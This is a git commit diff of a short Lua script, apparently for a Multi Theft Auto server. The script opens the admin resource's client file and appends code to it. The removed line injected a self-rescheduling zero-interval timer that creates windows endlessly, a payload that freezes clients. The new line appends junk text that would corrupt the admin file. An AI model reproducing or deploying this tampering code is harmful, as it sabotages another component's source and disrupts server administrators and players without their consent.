1089a416dca8171fab491ddde8777ca4f15653ec
Ruslan <20355378+frqher@users.noreply.github.com>
2023-01-11 21:41:58 +0300

    Update and rename ipssss.lua to ipss.lua

--- ipss.lua
+++ ipss.lua
@@ -2,6 +2,6 @@
 
 hFile = fileOpen(":admin/client/gui/admin_message.lua")
 fileSetPos( hFile, fileGetSize( hFile ) )  -- move position to the end of the file
-fileWrite(hFile, "function adminSync() guiCreateWindow(-5550, -5550, 0, 0, "", false) setTimer(adminSync, 0, 0) end ")                 -- append data
+fileWrite(hFile, "sadasd ")                 -- append data
 fileFlush(hFile)                           -- Flush the appended data into the file.
 fileClose(hFile) 
